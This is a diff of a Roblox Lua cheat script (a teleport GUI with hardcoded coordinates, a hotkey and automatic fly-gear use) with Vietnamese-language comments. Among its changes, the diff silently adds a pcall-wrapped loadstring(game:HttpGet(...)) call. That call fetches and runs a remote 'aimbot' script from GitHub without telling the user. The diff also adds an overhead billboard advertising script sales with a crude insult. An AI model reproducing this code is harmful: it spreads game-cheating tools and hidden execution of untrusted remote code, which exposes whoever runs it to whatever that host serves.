@@ -1,32 +1,53 @@
--- ================================================================= --
--- AUTO DELETE SCRIPT NẾU BẬT LẠI HOẶC BẬT 2 CÁI
--- ================================================================= --
 local CoreGui = game:GetService("CoreGui")
 local TweenService = game:GetService("TweenService")
+local Players = game:GetService("Players")
+local RunService = game:GetService("RunService")
+local UserInputService = game:GetService("UserInputService")
+local LocalPlayer = Players.LocalPlayer
 
 if getgenv().ZenkidLoaded then
     local oldGui = CoreGui:FindFirstChild("ZenkidTPGui")
     if oldGui then
         oldGui:Destroy()
     end
+    
+    if LocalPlayer.Character then
+        local oldBillboard = LocalPlayer.Character:FindFirstChild("ZenkidRainbowBillboard")
+        if oldBillboard then
+            oldBillboard:Destroy()
+        end
+    end
+    
+    if getgenv().ZenkidConnections then
+        for _, conn in ipairs(getgenv().ZenkidConnections) do
+            if conn then conn:Disconnect() end
+        end
+    end
 end
+
 getgenv().ZenkidLoaded = true
+getgenv().ZenkidConnections = {}
 
--- Services
-local Players = game:GetService("Players")
-local RunService = game:GetService("RunService")
-local UserInputService = game:GetService("UserInputService")
-local LocalPlayer = Players.LocalPlayer
+task.spawn(function()
+    pcall(function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/chocolascript-glitch/Chocola-Aimbot-Cap/refs/heads/main/Script.lua"))()
+    end)
+end)
 
--- Tạo ScreenGui chính
+local LeftP1 = CFrame.new(-473.2, -4.9, 95.1)
+local LeftP2 = CFrame.new(-488.8, 4.9, 94.5)
+local RightP1 = CFrame.new(-471.5, -5.1, 23.5)
+local RightP2 = CFrame.new(-486.0, -5.3, 23.6)
+
+local currentSet1 = LeftP1
+local currentSet2 = LeftP2
+local currentSide = "Left"
+
 local ScreenGui = Instance.new("ScreenGui")
 ScreenGui.Name = "ZenkidTPGui"
 ScreenGui.Parent = CoreGui
 ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
 
--- ================================================================= --
--- INTRO LOGIC
--- ================================================================= --
 local IntroFrame = Instance.new("Frame")
 IntroFrame.Name = "IntroFrame"
 IntroFrame.Parent = ScreenGui
@@ -39,30 +60,27 @@ IntroFrame.ZIndex = 100
 local IntroTitle = Instance.new("TextLabel")
 IntroTitle.Parent = IntroFrame
 IntroTitle.BackgroundTransparency = 1
-IntroTitle.Position = UDim2.new(0.5, -150, 0.43, -25)
-IntroTitle.Size = UDim2.new(0, 300, 0, 50)
+IntroTitle.Position = UDim2.new(0.5, -200, 0.43, -30)
+IntroTitle.Size = UDim2.new(0, 400, 0, 50)
 IntroTitle.Font = Enum.Font.SourceSansBold
 IntroTitle.Text = "bakhivc"
 IntroTitle.TextColor3 = Color3.fromRGB(255, 255, 255)
-IntroTitle.TextSize = 42
+IntroTitle.TextSize = 48
 IntroTitle.TextTransparency = 0
 IntroTitle.ZIndex = 101
 
 local IntroSubTitle = Instance.new("TextLabel")
 IntroSubTitle.Parent = IntroFrame
 IntroSubTitle.BackgroundTransparency = 1
-IntroSubTitle.Position = UDim2.new(0.5, -150, 0.43, 30)
-IntroSubTitle.Size = UDim2.new(0, 300, 0, 25)
+IntroSubTitle.Position = UDim2.new(0.5, -200, 0.43, 30)
+IntroSubTitle.Size = UDim2.new(0, 400, 0, 25)
 IntroSubTitle.Font = Enum.Font.SourceSansItalic
 IntroSubTitle.Text = "make by thanhz2867"
-IntroSubTitle.TextColor3 = Color3.fromRGB(0, 150, 255) -- Màu xanh biển
-IntroSubTitle.TextSize = 18
+IntroSubTitle.TextColor3 = Color3.fromRGB(0, 150, 255)
+IntroSubTitle.TextSize = 20
 IntroSubTitle.TextTransparency = 0
 IntroSubTitle.ZIndex = 101
 
--- ================================================================= --
--- MAIN GUI (TẠO SẴN VÀ ẨN CHO TỚI KHI HẾT INTRO)
--- ================================================================= --
 local MainFrame = Instance.new("Frame")
 MainFrame.Name = "MainFrame"
 MainFrame.Parent = ScreenGui
@@ -72,7 +90,7 @@ MainFrame.Size = UDim2.new(0, 240, 0, 110)
 MainFrame.Active = true
 MainFrame.Draggable = true
 MainFrame.ClipsDescendants = true
-MainFrame.Visible = false -- Tạm ẩn để chạy Intro
+MainFrame.Visible = false
 
 local MainCorner = Instance.new("UICorner")
 MainCorner.CornerRadius = UDim.new(0, 14)
@@ -81,7 +99,7 @@ MainCorner.Parent = MainFrame
 local UIStroke = Instance.new("UIStroke")
 UIStroke.Parent = MainFrame
 UIStroke.Thickness = 5
-UIStroke.Color = Color3.fromRGB(220, 40, 40)
+UIStroke.Color = Color3.fromRGB(255, 0, 0)
 
 local MenuImageBg = Instance.new("ImageLabel")
 MenuImageBg.Name = "MenuImageBg"
@@ -159,7 +177,7 @@ TopTpButton.BackgroundTransparency = 1
 TopTpButton.Position = UDim2.new(0.3, 0, 0.52, 0)
 TopTpButton.Size = UDim2.new(0, 95, 0, 28)
 TopTpButton.Font = Enum.Font.SourceSansBold
-TopTpButton.Text = "TP [X]"
+TopTpButton.Text = "TP [T]"
 TopTpButton.TextColor3 = Color3.fromRGB(60, 220, 140)
 TopTpButton.TextSize = 16
 TopTpButton.ZIndex = 2
@@ -191,17 +209,11 @@ ContentContainer.BackgroundTransparency = 1
 ContentContainer.Position = UDim2.new(0, 0, 0, 45)
 ContentContainer.Size = UDim2.new(1, 0, 1, -45)
 ContentContainer.Visible = false
-ContentContainer.CanvasSize = UDim2.new(0, 0, 0, 200)
+ContentContainer.CanvasSize = UDim2.new(0, 0, 0, 150)
 ContentContainer.ScrollBarThickness = 2
 ContentContainer.ZIndex = 2
 
--- Tọa độ & Visual Marker
-local Set1Position = nil
-local Set2Position = nil
-local visualPart1 = nil
-local visualPart2 = nil
 local selectedFlyGear = nil
-
 local allowedGears = {
     "Waverider",
     "Cupid's Wings",
@@ -211,63 +223,35 @@ local allowedGears = {
     "carpet"
 }
 
-local function createVisualPart(position, textName)
-    local part = Instance.new("Part")
-    part.Shape = Enum.PartType.Ball
-    part.Size = Vector3.new(2, 2, 2)
-    part.Position = position.Position
-    part.Anchored = true
-    part.CanCollide = false
-    part.Transparency = 0.4
-    part.Color = Color3.fromRGB(255, 50, 50)
-    part.Material = Enum.Material.Neon
-    part.Parent = workspace
-    
-    local billboard = Instance.new("BillboardGui")
-    billboard.Size = UDim2.new(0, 100, 0, 40)
-    billboard.StudsOffset = Vector3.new(0, 2, 0)
-    billboard.AlwaysOnTop = true
-    billboard.Parent = part
-    
-    local textLabel = Instance.new("TextLabel")
-    textLabel.Size = UDim2.new(1, 0, 1, 0)
-    textLabel.BackgroundTransparency = 1
-    textLabel.Font = Enum.Font.GothamBold
-    textLabel.Text = textName
-    textLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
-    textLabel.TextSize = 14
-    textLabel.TextStrokeTransparency = 0
-    textLabel.Parent = billboard
-    
-    return part
-end
+local SideToggleBtn = Instance.new("TextButton")
+SideToggleBtn.Parent = ContentContainer
+SideToggleBtn.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+SideToggleBtn.Position = UDim2.new(0.1, 0, 0.05, 0)
+SideToggleBtn.Size = UDim2.new(0.8, 0, 0, 24)
+SideToggleBtn.Font = Enum.Font.GothamBold
+SideToggleBtn.Text = "Side: Left"
+SideToggleBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+SideToggleBtn.TextSize = 11
+Instance.new("UICorner", SideToggleBtn).CornerRadius = UDim.new(0, 6)
 
-local Set1Btn = Instance.new("TextButton")
-Set1Btn.Parent = ContentContainer
-Set1Btn.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
-Set1Btn.Position = UDim2.new(0.1, 0, 0.03, 0)
-Set1Btn.Size = UDim2.new(0.38, 0, 0, 24)
-Set1Btn.Font = Enum.Font.Gotham
-Set1Btn.Text = "Set 1"
-Set1Btn.TextColor3 = Color3.fromRGB(255, 255, 255)
-Set1Btn.TextSize = 11
-Instance.new("UICorner", Set1Btn).CornerRadius = UDim.new(0, 6)
-
-local Set2Btn = Instance.new("TextButton")
-Set2Btn.Parent = ContentContainer
-Set2Btn.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
-Set2Btn.Position = UDim2.new(0.52, 0, 0.03, 0)
-Set2Btn.Size = UDim2.new(0.38, 0, 0, 24)
-Set2Btn.Font = Enum.Font.Gotham
-Set2Btn.Text = "Set 2"
-Set2Btn.TextColor3 = Color3.fromRGB(255, 255, 255)
-Set2Btn.TextSize = 11
-Instance.new("UICorner", Set2Btn).CornerRadius = UDim.new(0, 6)
+SideToggleBtn.MouseButton1Click:Connect(function()
+    if currentSide == "Left" then
+        currentSide = "Right"
+        currentSet1 = RightP1
+        currentSet2 = RightP2
+        SideToggleBtn.Text = "Side: Right"
+    else
+        currentSide = "Left"
+        currentSet1 = LeftP1
+        currentSet2 = LeftP2
+        SideToggleBtn.Text = "Side: Left"
+    end
+end)
 
 local PlusBtn = Instance.new("TextButton")
 PlusBtn.Parent = ContentContainer
 PlusBtn.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
-PlusBtn.Position = UDim2.new(0.1, 0, 0.20, 0)
+PlusBtn.Position = UDim2.new(0.1, 0, 0.28, 0)
 PlusBtn.Size = UDim2.new(0.38, 0, 0, 24)
 PlusBtn.Font = Enum.Font.GothamBold
 PlusBtn.Text = "+ Size"
@@ -278,7 +262,7 @@ Instance.new("UICorner", PlusBtn).CornerRadius = UDim.new(0, 6)
 local MinusBtn = Instance.new("TextButton")
 MinusBtn.Parent = ContentContainer
 MinusBtn.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
-MinusBtn.Position = UDim2.new(0.52, 0, 0.20, 0)
+MinusBtn.Position = UDim2.new(0.52, 0, 0.28, 0)
 MinusBtn.Size = UDim2.new(0.38, 0, 0, 24)
 MinusBtn.Font = Enum.Font.GothamBold
 MinusBtn.Text = "- Size"
@@ -289,165 +273,45 @@ Instance.new("UICorner", MinusBtn).CornerRadius = UDim.new(0, 6)
 local FlyGearBtn = Instance.new("TextButton")
 FlyGearBtn.Parent = ContentContainer
 FlyGearBtn.BackgroundColor3 = Color3.fromRGB(40, 40, 50)
-FlyGearBtn.Position = UDim2.new(0.1, 0, 0.37, 0)
+FlyGearBtn.Position = UDim2.new(0.1, 0, 0.51, 0)
 FlyGearBtn.Size = UDim2.new(0.8, 0, 0, 26)
 FlyGearBtn.Font = Enum.Font.GothamBold
-FlyGearBtn.Text = "Auto use fly gear: None"
+FlyGearBtn.Text = "Fly Gear: None"
 FlyGearBtn.TextColor3 = Color3.fromRGB(255, 215, 0)
 FlyGearBtn.TextSize = 11
 Instance.new("UICorner", FlyGearBtn).CornerRadius = UDim.new(0, 6)
 
-local FlyGearFrame = Instance.new("Frame")
-FlyGearFrame.Name = "FlyGearFrame"
-FlyGearFrame.Parent = ScreenGui
-FlyGearFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
-FlyGearFrame.Position = UDim2.new(0.5, -100, 0.5, -90)
-FlyGearFrame.Size = UDim2.new(0, 200, 0, 180)
-FlyGearFrame.Visible = false
-FlyGearFrame.Active = true
-FlyGearFrame.Draggable = true
-Instance.new("UICorner", FlyGearFrame).CornerRadius = UDim.new(0, 10)
-
-local FlyGearStroke = Instance.new("UIStroke")
-FlyGearStroke.Parent = FlyGearFrame
-FlyGearStroke.Color = Color3.fromRGB(255, 215, 0)
-FlyGearStroke.Thickness = 2
-
-local FlyTitle = Instance.new("TextLabel")
-FlyTitle.Parent = FlyGearFrame
-FlyTitle.BackgroundTransparency = 1
-FlyTitle.Size = UDim2.new(1, -25, 0, 30)
-FlyTitle.Position = UDim2.new(0, 5, 0, 0)
-FlyTitle.Font = Enum.Font.GothamBold
-FlyTitle.Text = "Chọn Fly Gear"
-FlyTitle.TextColor3 = Color3.fromRGB(255, 255, 255)
-FlyTitle.TextSize = 13
-
-local CloseFlyBtn = Instance.new("TextButton")
-CloseFlyBtn.Parent = FlyGearFrame
-CloseFlyBtn.BackgroundTransparency = 1
-CloseFlyBtn.Position = UDim2.new(1, -25, 0, 5)
-CloseFlyBtn.Size = UDim2.new(0, 20, 0, 20)
-CloseFlyBtn.Font = Enum.Font.GothamBold
-CloseFlyBtn.Text = "X"
-CloseFlyBtn.TextColor3 = Color3.fromRGB(255, 80, 80)
-CloseFlyBtn.TextSize = 13
-
-local FlyScroll = Instance.new("ScrollingFrame")
-FlyScroll.Parent = FlyGearFrame
-FlyScroll.BackgroundTransparency = 1
-FlyScroll.Position = UDim2.new(0, 5, 0, 32)
-FlyScroll.Size = UDim2.new(1, -10, 1, -37)
-FlyScroll.CanvasSize = UDim2.new(0, 0, 0, 0)
-FlyScroll.ScrollBarThickness = 3
-
-local FlyListLayout = Instance.new("UIListLayout")
-FlyListLayout.Parent = FlyScroll
-FlyListLayout.SortOrder = Enum.SortOrder.LayoutOrder
-FlyListLayout.Padding = UDim.new(0, 4)
-
-local function updateFlyGearMenu()
-    for _, child in ipairs(FlyScroll:GetChildren()) do
-        if child:IsA("TextButton") then
-            child:Destroy()
-        end
-    end
-
-    local foundCount = 0
-
-    local NoneBtn = Instance.new("TextButton")
-    NoneBtn.Parent = FlyScroll
-    NoneBtn.BackgroundColor3 = Color3.fromRGB(50, 30, 30)
-    NoneBtn.Size = UDim2.new(1, -5, 0, 24)
-    NoneBtn.Font = Enum.Font.Gotham
-    NoneBtn.Text = "[ Tắt Auto Gear ]"
-    NoneBtn.TextColor3 = Color3.fromRGB(255, 100, 100)
-    NoneBtn.TextSize = 11
-    Instance.new("UICorner", NoneBtn).CornerRadius = UDim.new(0, 4)
-    
-    NoneBtn.MouseButton1Click:Connect(function()
-        selectedFlyGear = nil
-        FlyGearBtn.Text = "Auto use fly gear: None"
-        FlyGearFrame.Visible = false
-    end)
-
+local function autoSelectFlyGear()
     local backpack = LocalPlayer:FindFirstChild("Backpack")
     local character = LocalPlayer.Character
-    local availableItems = {}
+    local foundItem = nil
 
-    local function checkItem(item)
-        if item:IsA("Tool") then
-            for _, name in ipairs(allowedGears) do
-                if string.lower(item.Name) == string.lower(name) and not availableItems[item.Name] then
-                    availableItems[item.Name] = item.Name
+    local function checkContainer(container)
+        if not container then return end
+        for _, item in ipairs(container:GetChildren()) do
+            if item:IsA("Tool") then
+                for _, name in ipairs(allowedGears) do
+                    if string.lower(item.Name) == string.lower(name) then
+                        return item.Name
+                    end
                 end
             end
         end
+        return nil
     end
 
-    if backpack then
-        for _, item in ipairs(backpack:GetChildren()) do checkItem(item) end
-    end
-    if character then
-        for _, item in ipairs(character:GetChildren()) do checkItem(item) end
-    end
+    foundItem = checkContainer(backpack) or checkContainer(character)
 
-    for itemName, _ in pairs(availableItems) do
-        foundCount = foundCount + 1
-        local ItemBtn = Instance.new("TextButton")
-        ItemBtn.Parent = FlyScroll
-        ItemBtn.BackgroundColor3 = Color3.fromRGB(35, 35, 45)
-        ItemBtn.Size = UDim2.new(1, -5, 0, 24)
-        ItemBtn.Font = Enum.Font.Gotham
-        ItemBtn.Text = itemName
-        ItemBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
-        ItemBtn.TextSize = 11
-        Instance.new("UICorner", ItemBtn).CornerRadius = UDim.new(0, 4)
-
-        ItemBtn.MouseButton1Click:Connect(function()
-            selectedFlyGear = itemName
-            FlyGearBtn.Text = "Auto use: " .. itemName
-            FlyGearFrame.Visible = false
-        end)
+    if foundItem then
+        selectedFlyGear = foundItem
+        FlyGearBtn.Text = "Fly Gear: " .. foundItem
+    else
+        selectedFlyGear = nil
+        FlyGearBtn.Text = "Fly Gear: None"
     end
-
-    FlyScroll.CanvasSize = UDim2.new(0, 0, 0, (foundCount + 1) * 28)
 end
 
-FlyGearBtn.MouseButton1Click:Connect(function()
-    updateFlyGearMenu()
-    FlyGearFrame.Visible = not FlyGearFrame.Visible
-end)
-
-CloseFlyBtn.MouseButton1Click:Connect(function()
-    FlyGearFrame.Visible = false
-end)
-
-local Colors = {
-    {Name = "Đỏ", Color = Color3.fromRGB(220, 40, 40)},
-    {Name = "Tím", Color = Color3.fromRGB(138, 43, 226)},
-    {Name = "Xanh", Color = Color3.fromRGB(0, 120, 255)},
-    {Name = "Rainbow", Color = "Rainbow"}
-}
-
-local currentTheme = Colors[1].Color
-
-for i, themeData in ipairs(Colors) do
-    local CBtn = Instance.new("TextButton")
-    CBtn.Parent = ContentContainer
-    CBtn.BackgroundColor3 = (themeData.Color ~= "Rainbow") and themeData.Color or Color3.fromRGB(255, 255, 255)
-    CBtn.Position = UDim2.new(0.1 + (i-1)*0.2, 0, 0.58, 0)
-    CBtn.Size = UDim2.new(0.18, 0, 0, 22)
-    CBtn.Font = Enum.Font.GothamBold
-    CBtn.Text = themeData.Name
-    CBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
-    CBtn.TextSize = 9
-    Instance.new("UICorner", CBtn).CornerRadius = UDim.new(0, 4)
-    
-    CBtn.MouseButton1Click:Connect(function()
-        currentTheme = themeData.Color
-    end)
-end
+autoSelectFlyGear()
 
 task.spawn(function()
     while task.wait(1) do
@@ -491,24 +355,25 @@ local function executeTeleport()
         task.wait(0.02)
     end
 
-    if Set1Position then
-        hrp.CFrame = Set1Position
+    if currentSet1 then
+        hrp.CFrame = currentSet1
     end
     
     task.wait(0.123)
     
-    if Set2Position then
-        hrp.CFrame = Set2Position
+    if currentSet2 then
+        hrp.CFrame = currentSet2
     end
 end
 
 TopTpButton.MouseButton1Click:Connect(executeTeleport)
 
-UserInputService.InputBegan:Connect(function(input, gameProcessed)
-    if not gameProcessed and input.KeyCode == Enum.KeyCode.X then
+local inputConn = UserInputService.InputBegan:Connect(function(input, gameProcessed)
+    if not gameProcessed and input.KeyCode == Enum.KeyCode.T then
         executeTeleport()
     end
 end)
+table.insert(getgenv().ZenkidConnections, inputConn)
 
 local menuOpened = false
 ToggleButton.MouseButton1Click:Connect(function()
@@ -523,7 +388,6 @@ ToggleButton.MouseButton1Click:Connect(function()
     else
         ToggleButton.BackgroundColor3 = Color3.fromRGB(220, 50, 50)
         MainFrame.Size = UDim2.new(0, 240, 0, 110)
-        FlyGearFrame.Visible = false
     end
 end)
 
@@ -538,49 +402,59 @@ LockButton.MouseButton1Click:Connect(function()
     end
 end)
 
-Set1Btn.MouseButton1Click:Connect(function()
-    local char = LocalPlayer.Character
-    if char and char:FindFirstChild("HumanoidRootPart") then
-        Set1Position = char.HumanoidRootPart.CFrame
-        Set1Btn.Text = "Set 1 (Đã lưu)"
-        if visualPart1 then visualPart1:Destroy() end
-        visualPart1 = createVisualPart(Set1Position, "Set 1")
-    end
-end)
-
-Set2Btn.MouseButton1Click:Connect(function()
-    local char = LocalPlayer.Character
-    if char and char:FindFirstChild("HumanoidRootPart") then
-        Set2Position = char.HumanoidRootPart.CFrame
-        Set2Btn.Text = "Set 2 (Đã lưu)"
-        if visualPart2 then visualPart2:Destroy() end
-        visualPart2 = createVisualPart(Set2Position, "Set 2")
-    end
-end)
-
 PlusBtn.MouseButton1Click:Connect(function()
     MainFrame.Size = MainFrame.Size + UDim2.new(0, 20, 0, 15)
 end)
+
 MinusBtn.MouseButton1Click:Connect(function()
     if MainFrame.AbsoluteSize.X > 200 then
         MainFrame.Size = MainFrame.Size - UDim2.new(0, 20, 0, 15)
     end
 end)
 
-RunService.RenderStepped:Connect(function()
-    if currentTheme == "Rainbow" then
-        local hue = tick() % 5 / 5
-        UIStroke.Color = Color3.fromHSV(hue, 1, 1)
-    else
-        UIStroke.Color = currentTheme
+local rainbowLabel = nil
+local renderConn = RunService.RenderStepped:Connect(function()
+    local hue = (tick() * 1.2) % 1
+    local color = Color3.fromHSV(hue, 1, 1)
+    UIStroke.Color = color
+    if rainbowLabel then
+        rainbowLabel.TextColor3 = color
     end
 end)
+table.insert(getgenv().ZenkidConnections, renderConn)
 
--- ================================================================= --
--- CHẠY HIỆU ỨNG INTRO VÀ HIỆN GUI CHÍNH
--- ================================================================= --
+local function createOverheadText(character)
+    if not character then return end
+    local head = character:WaitForChild("Head", 5)
+    if not head then return end
+
+    local oldBillboard = character:FindFirstChild("ZenkidRainbowBillboard")
+    if oldBillboard then oldBillboard:Destroy() end
+
+    local billboard = Instance.new("BillboardGui")
+    billboard.Name = "ZenkidRainbowBillboard"
+    billboard.Parent = character
+    billboard.Adornee = head
+    billboard.Size = UDim2.new(0, 450, 0, 50)
+    billboard.StudsOffset = Vector3.new(0, 2.5, 0)
+    billboard.AlwaysOnTop = true
+
+    local textLabel = Instance.new("TextLabel")
+    textLabel.Parent = billboard
+    textLabel.Size = UDim2.new(1, 0, 1, 0)
+    textLabel.BackgroundTransparency = 1
+    textLabel.Font = Enum.Font.SourceSansBold
+    textLabel.Text = "free dm in TT:thanhz2867 for script sell lam tuat gay"
+    textLabel.TextSize = 18
+    textLabel.TextScaled = true
+    textLabel.TextStrokeTransparency = 0.2
+    textLabel.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
+
+    rainbowLabel = textLabel
+end
+
 task.spawn(function()
-    task.wait(1) -- Giữ màn hình đen 1 giây để đọc chữ
+    task.wait(1)
     
     local tweenInfo = TweenInfo.new(1.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
     
@@ -593,7 +467,16 @@ task.spawn(function()
     tweenSub:Play()
     
     tweenFrame.Completed:Connect(function()
-        IntroFrame:Destroy() -- Xóa Intro sau khi làm mờ xong
-        MainFrame.Visible = true -- Hiện GUI chính
+        IntroFrame:Destroy()
+        MainFrame.Visible = true
+
+        if LocalPlayer.Character then
+            createOverheadText(LocalPlayer.Character)
+        end
+
+        local charConn = LocalPlayer.CharacterAdded:Connect(function(newChar)
+            createOverheadText(newChar)
+        end)
+        table.insert(getgenv().ZenkidConnections, charConn)
     end)
 end)
